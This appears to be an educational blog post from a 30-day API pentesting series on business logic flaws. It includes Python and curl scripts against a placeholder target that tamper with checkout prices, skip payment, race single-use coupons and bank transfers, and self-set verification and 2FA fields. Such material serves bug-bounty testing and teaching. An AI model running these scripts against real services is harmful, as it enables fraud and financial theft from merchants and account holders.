# API Business Logic Flaws: The Bugs No Scanner Ever Finds

> **Series:** 30-Day API Pentesting | **Day 22** | Week 4: Advanced Attacks  
> **Difficulty:** Intermediate  
> **Topic:** API Business Logic Vulnerabilities — 5 Attack Patterns

---

## What Are Business Logic Flaws?

Every other vulnerability we've studied so far is about **technical mistakes** — wrong algorithm (alg:none JWT), missing validation (BOLA), improper sanitization (SQLi). Security scanners can detect those because they follow known patterns.

Business logic flaws are different. They're bugs in **how the application is designed to work**, not in the technical implementation. The code is technically correct — it does exactly what the developer programmed it to do. But the developer made a wrong *assumption* about how users would interact with the system.

```
Technical bug example (scanner finds it):
  Input: id=1' OR 1=1--
  Problem: SQL injection — textbook, detectable

Business logic bug example (scanner cannot find it):
  Normal flow: add to cart → pay → get item
  Attack flow:  add to cart → [skip payment] → claim item
  Problem: the skip is valid HTTP — server just wasn't supposed to allow it
```

### Why Business Logic Bugs Pay the Most

```
P4 (Low):     $100-500    → XSS with no impact
P3 (Medium):  $500-2000   → IDOR on non-sensitive data
P2 (High):    $2000-8000  → BOLA with sensitive data
P1 (Critical):$8000-50000 → Auth bypass, business logic that loses money

A price manipulation bug that lets users buy anything for $0.01
= direct financial loss to the company = Critical = maximum payout
```

### The Mindset Shift

To find business logic bugs, you need to stop thinking like a security scanner and start thinking like a confused, adversarial user:

```
Questions to ask for EVERY feature:
  1. What happens if I skip this step?
  2. What happens if I repeat this step?
  3. What happens if I send negative/zero/huge values?
  4. What happens if I do two things at the exact same time?
  5. What happens if I change the order of operations?
  6. What values is the server trusting from me that it shouldn't?
```

---

## Attack 1: Price & Quantity Manipulation

### The Core Assumption Being Exploited

Developers often design the UI to show the correct price, assuming that's what gets sent to the server. But the client controls the request — and in API-based apps, that means the JSON body.

**Trust assumption broken:** "The price/total in the checkout request reflects what we showed the user."

### Testing Price Manipulation

```bash
# Step 1: Find the checkout/purchase endpoint
# Browse the app, intercept in Burp, find the POST /checkout or similar

# Step 2: Look at what fields are in the request body
POST /api/v1/checkout HTTP/1.1
Content-Type: application/json
Authorization: Bearer TOKEN

{
    "items": [
        {
            "productId": "LAPTOP-001",
            "quantity": 1,
            "unitPrice": 999.99,   ← THIS is the field to attack
            "name": "MacBook Pro"
        }
    ],
    "subtotal": 999.99,            ← AND THIS
    "tax": 89.99,
    "total": 1089.98               ← AND THIS
}

# Step 3: Send with modified values
{
    "items": [{"productId":"LAPTOP-001","quantity":1,"unitPrice":0.01}],
    "subtotal": 0.01,
    "tax": 0.00,
    "total": 0.01
}

# Step 4: Check if order is created successfully
# HTTP 201 Created = server trusted the client-supplied price
```

```python
import requests

TARGET = "https://api.target.com"
TOKEN  = "Bearer YOUR_TOKEN"
HEADERS = {"Authorization": TOKEN, "Content-Type": "application/json"}

# Test 1: Minimum price
resp = requests.post(f"{TARGET}/api/v1/checkout", headers=HEADERS, json={
    "items": [{"productId": "PROD-001", "quantity": 1, "unitPrice": 0.01}],
    "total": 0.01
})
print(f"Price=0.01: {resp.status_code}")
if resp.status_code in [200, 201]:
    print("VULNERABLE: Server accepted client-supplied price!")

# Test 2: Zero price
resp = requests.post(f"{TARGET}/api/v1/checkout", headers=HEADERS, json={
    "items": [{"productId": "PROD-001", "quantity": 1, "unitPrice": 0}],
    "total": 0
})
print(f"Price=0: {resp.status_code}")

# Test 3: Negative price (may result in refund/credit)
resp = requests.post(f"{TARGET}/api/v1/checkout", headers=HEADERS, json={
    "items": [{"productId": "PROD-001", "quantity": 1, "unitPrice": -500}],
    "total": -500
})
print(f"Price=-500: {resp.status_code} | {resp.text[:100]}")

# Test 4: Negative quantity
resp = requests.post(f"{TARGET}/api/v1/checkout", headers=HEADERS, json={
    "items": [{"productId": "PROD-001", "quantity": -1, "unitPrice": 999}],
    "total": -999  # negative total!
})
print(f"Qty=-1: {resp.status_code}")
```

### What to Look For

```
After sending modified checkout:

1. If 200/201 → order created → check:
   - Does order.total match what you sent? (0.01?)
   - Is the item actually fulfilled/shipped?
   - Is your account credited with the negative amount?

2. If 400 with message "price mismatch" → server validates
   But: try again with CORRECT total but wrong unit prices
   {items:[{price:0.01}], total:999.99}  ← total correct, item price wrong
   Maybe server only checks total, not line items?

3. Check the final invoice/receipt:
   GET /api/v1/orders/{orderId}
   → What price does it show?
```

---

## Attack 2: Workflow / Step Bypass

### The Core Assumption Being Exploited

Multi-step processes (checkout, verification, approval) assume users complete steps in order. APIs often don't enforce this — each step is a separate endpoint, and the server doesn't always check if previous steps were completed.

### Mapping the Workflow

```bash
# Step 1: Complete the flow normally in Burp to map all endpoints
# Normal e-commerce checkout:
#   Step 1: POST /api/cart/add          → cart updated
#   Step 2: POST /api/cart/checkout     → order created, orderId returned
#   Step 3: POST /api/payment/initiate  → payment session created
#   Step 4: POST /api/payment/confirm   → payment processed
#   Step 5: GET  /api/order/{id}        → order confirmed, item dispatched

# Step 2: Try calling later steps without earlier ones
```

```python
import requests

TARGET  = "https://api.target.com"
TOKEN   = "Bearer YOUR_TOKEN"
HEADERS = {"Authorization": TOKEN, "Content-Type": "application/json"}

# Create order normally (Step 1-2)
cart_resp = requests.post(f"{TARGET}/api/cart/checkout", headers=HEADERS,
    json={"items": [{"productId": "LAPTOP-001", "quantity": 1}]})
order_id = cart_resp.json().get("orderId")
print(f"Order created: {order_id}")

# === ATTACK: Skip payment step entirely ===
# Jump straight to Step 5 (order confirmation) without doing Steps 3-4

# Try to confirm order without paying
confirm_resp = requests.post(f"{TARGET}/api/order/{order_id}/confirm",
    headers=HEADERS, json={"orderId": order_id})
print(f"Confirm without payment: {confirm_resp.status_code}")
print(f"Response: {confirm_resp.text[:200]}")

# If 200 OK → order confirmed without payment!

# Also try: marking order as paid directly
paid_resp = requests.put(f"{TARGET}/api/order/{order_id}",
    headers=HEADERS, json={"paymentStatus": "completed", "status": "paid"})
print(f"Self-mark as paid: {paid_resp.status_code}")
```

### Other Workflow Bypass Patterns

```bash
# Pattern 1: Email verification bypass
# Normal: register → verify email → access account
# Attack:  register → directly access account features
curl -H "Authorization: Bearer TOKEN" \
    https://target.com/api/profile/edit   ← skip email verification step

# Pattern 2: 2FA bypass
# Normal: login → 2FA prompt → enter code → access
# Attack:  login → get session token → use token directly without 2FA
# Note: some apps give a partial-auth token BEFORE 2FA — test if it works fully

# Pattern 3: Admin approval workflow bypass
# Normal: submit request → admin approves → access granted
# Attack:  submit request → use resource immediately
curl -H "Authorization: Bearer TOKEN" \
    https://target.com/api/premium-feature   ← before approval completes

# Pattern 4: Repeat a completed step
# What if you complete step 3 twice?
# Example: POST /payment/confirm twice → double item dispatched?
# Or double the credit applied?
```

---

## Attack 3: Coupon & Discount Abuse

### Common Coupon Logic Failures

```python
import requests, threading, time

TARGET  = "https://api.target.com"
TOKEN   = "Bearer YOUR_TOKEN"
HEADERS = {"Authorization": TOKEN, "Content-Type": "application/json"}

# Test 1: Stack same coupon multiple times
print("\n=== Coupon Stacking Test ===")
for attempt in range(10):
    resp = requests.post(f"{TARGET}/api/cart/coupon", headers=HEADERS,
        json={"code": "SAVE10", "cartId": "CART-123"})
    print(f"Attempt {attempt+1}: {resp.status_code} | {resp.text[:60]}")
    if resp.status_code != 200:
        print(f"Blocked at attempt {attempt+1}")
        break

# Check cart total — is discount stacked?
cart = requests.get(f"{TARGET}/api/cart/CART-123", headers=HEADERS).json()
print(f"Cart discount: {cart.get('discount')}")

# Test 2: Race condition — apply single-use coupon simultaneously
print("\n=== Race Condition Coupon Test ===")
results = []
def apply_coupon():
    resp = requests.post(f"{TARGET}/api/cart/coupon", headers=HEADERS,
        json={"code": "FIRST50", "cartId": "CART-456"})  # single-use 50% off
    results.append(resp.status_code)

# Send 5 simultaneous requests
threads = [threading.Thread(target=apply_coupon) for _ in range(5)]
for t in threads: t.start()
for t in threads: t.join()
print(f"Results: {results}")
# If more than one 200 → race condition, coupon used multiple times!

# Test 3: Negative discount value
print("\n=== Negative Discount Test ===")
resp = requests.post(f"{TARGET}/api/cart/coupon", headers=HEADERS,
    json={"code": "SAVE10", "discountAmount": -50, "cartId": "CART-123"})
print(f"Negative discount: {resp.status_code} | {resp.text[:60]}")
```

---

## Attack 4: Account Balance & Transfer Logic

### Transfer-to-Self Bug

```python
import requests, threading

TARGET  = "https://api.target.com"
TOKEN   = "Bearer YOUR_TOKEN"
HEADERS = {"Authorization": TOKEN, "Content-Type": "application/json"}

# Get your own account IDs first
accounts = requests.get(f"{TARGET}/api/accounts", headers=HEADERS).json()
my_account_id = accounts[0]["id"]
print(f"Account ID: {my_account_id} | Balance: {accounts[0]['balance']}")

# Test: Transfer from yourself to yourself
resp = requests.post(f"{TARGET}/api/transfer", headers=HEADERS, json={
    "fromAccountId": my_account_id,
    "toAccountId":   my_account_id,   # same account!
    "amount": 1000,
    "currency": "USD"
})
print(f"Self-transfer: {resp.status_code}")

# Check if balance doubled
account = requests.get(f"{TARGET}/api/accounts/{my_account_id}", headers=HEADERS).json()
print(f"New balance: {account['balance']}")
# If balance went from 1000 → 2000, or stayed 1000 (credit without debit) → bug!
```

### Race Condition — Double Spend

```python
import requests, threading, time

TARGET  = "https://api.target.com"
TOKEN   = "Bearer YOUR_TOKEN"
HEADERS = {"Authorization": TOKEN, "Content-Type": "application/json"}

# Scenario: $600 balance, transfer $500 to each of two accounts simultaneously
# Normally: first transfer succeeds ($600-$500=$100), second fails (insufficient)
# Race condition: both check balance simultaneously ($600 > $500 each) → both succeed

ATTACKER_ACCT_1 = "ACCT-ATTACKER-1"
ATTACKER_ACCT_2 = "ACCT-ATTACKER-2"
MY_ACCOUNT      = "ACCT-MINE"

results = []
def transfer(to_account):
    resp = requests.post(f"{TARGET}/api/transfer", headers=HEADERS, json={
        "fromAccountId": MY_ACCOUNT,
        "toAccountId": to_account,
        "amount": 500
    })
    results.append((to_account, resp.status_code, resp.text[:50]))

# Create and start both threads at EXACTLY the same time
t1 = threading.Thread(target=transfer, args=(ATTACKER_ACCT_1,))
t2 = threading.Thread(target=transfer, args=(ATTACKER_ACCT_2,))

# Start simultaneously
t1.start(); t2.start()
t1.join();  t2.join()

for acct, code, text in results:
    print(f"Transfer to {acct}: {code} | {text}")

# If both return 200 → race condition! $1000 transferred from $600 balance
```

---

## Attack 5: Status & State Manipulation

### Direct Status Override

```python
import requests

TARGET  = "https://api.target.com"
TOKEN   = "Bearer YOUR_TOKEN"
HEADERS = {"Authorization": TOKEN, "Content-Type": "application/json"}

# Test: Can a buyer mark their own order as "delivered" before paying?
order_id = "ORDER-12345"  # your unpaid order

# Attempt 1: Update status directly
resp = requests.put(f"{TARGET}/api/orders/{order_id}", headers=HEADERS,
    json={"status": "delivered", "paymentStatus": "paid"})
print(f"Status override: {resp.status_code}")

# Attempt 2: Try each status
for status in ["delivered", "shipped", "paid", "completed", "refunded", "approved"]:
    r = requests.put(f"{TARGET}/api/orders/{order_id}", headers=HEADERS,
        json={"status": status})
    print(f"{status}: {r.status_code}")

# Attempt 3: For seller payout — if marking shipped triggers payout
# PUT /api/orders/{id} {status:'shipped'} → triggers automatic payout to seller
# Even if item wasn't actually shipped!
```

### Account Verification Bypass

```python
# Test: Self-verify account without email link
resp = requests.put(f"{TARGET}/api/account/profile", headers=HEADERS,
    json={
        "name": "Test User",
        "email": "test@test.com",
        "emailVerified": True,       # try to set yourself as verified
        "phoneVerified": True,
        "kycVerified": True,
        "twoFactorEnabled": False    # try to disable 2FA
    })
print(f"Self-verify: {resp.status_code}")

# Then check if account shows as verified
profile = requests.get(f"{TARGET}/api/account/profile", headers=HEADERS).json()
print(f"Verified: {profile.get('emailVerified')}")
```

---

## Complete Business Logic Testing Checklist Script

```bash
#!/bin/bash
# Run through every business logic test category

TARGET="https://api.target.com"
TOKEN="Bearer YOUR_TOKEN"
AUTH="-H 'Authorization: $TOKEN' -H 'Content-Type: application/json'"

echo "=== 1. PRICE MANIPULATION ==="
curl -X POST "$TARGET/api/checkout" \
    -H "Authorization: $TOKEN" -H "Content-Type: application/json" \
    -d '{"items":[{"id":"PROD-1","qty":1,"price":0.01}],"total":0.01}'

echo ""
echo "=== 2. NEGATIVE QUANTITY ==="
curl -X POST "$TARGET/api/cart/add" \
    -H "Authorization: $TOKEN" -H "Content-Type: application/json" \
    -d '{"productId":"PROD-1","quantity":-1}'

echo ""
echo "=== 3. WORKFLOW BYPASS — skip payment ==="
ORDER_ID="ORDER-123"
curl -X POST "$TARGET/api/orders/$ORDER_ID/confirm" \
    -H "Authorization: $TOKEN" -H "Content-Type: application/json"

echo ""
echo "=== 4. COUPON STACKING ==="
for i in 1 2 3 4 5; do
    curl -s -X POST "$TARGET/api/coupon/apply" \
        -H "Authorization: $TOKEN" -H "Content-Type: application/json" \
        -d '{"code":"SAVE10"}' | grep -o '"discount":[0-9.]*'
done

echo ""
echo "=== 5. STATUS MANIPULATION ==="
curl -X PUT "$TARGET/api/orders/$ORDER_ID" \
    -H "Authorization: $TOKEN" -H "Content-Type: application/json" \
    -d '{"status":"delivered","paymentStatus":"paid"}'

echo ""
echo "=== 6. SELF-TRANSFER ==="
curl -X POST "$TARGET/api/transfer" \
    -H "Authorization: $TOKEN" -H "Content-Type: application/json" \
    -d '{"from":"MY_ACCT","to":"MY_ACCT","amount":1000}'
```

---

## Severity Guide for Business Logic Reports

| Finding | Severity | Why |
|---------|----------|-----|
| Buy item for $0.01 (price accepted from client) | Critical | Direct financial loss |
| Skip payment step, get item | Critical | Direct financial loss |
| Balance doubling via self-transfer | Critical | Financial fraud |
| Race condition on coupon (double-spend) | High | Financial abuse |
| Status manipulation (mark delivered unpaid) | High | Fraud enablement |
| Coupon stacking (multiple use) | Medium-High | Financial loss |
| Negative quantity results in refund credit | High | Financial loss |
| Account verification bypass | Medium | Trust/compliance issue |

---

## Checklist

```
☐  Modify all numeric values — price=0.01, qty=-1, discount=100 on every req
☐  Map multi-step flows — draw every step, then skip each one
☐  Skip payment step — POST /confirm without POST /payment
☐  Repeat every step — complete step 3 twice — what changes?
☐  Stack coupons — apply same code 10x, check if discount multiplies
☐  Self-transfer — from == to in any transfer endpoint
☐  Race condition — curl parallel x5 on single-use coupon/transfer
☐  Manipulate status — PUT {status:delivered/approved/verified}
☐  Negative values everywhere — quantity, amount, price, discount
☐  Check final state — GET the object after attack — did it actually work?
```

---

*Written by @anand87794*  
*30-Day API Pentesting Series — Day 22 of 30*
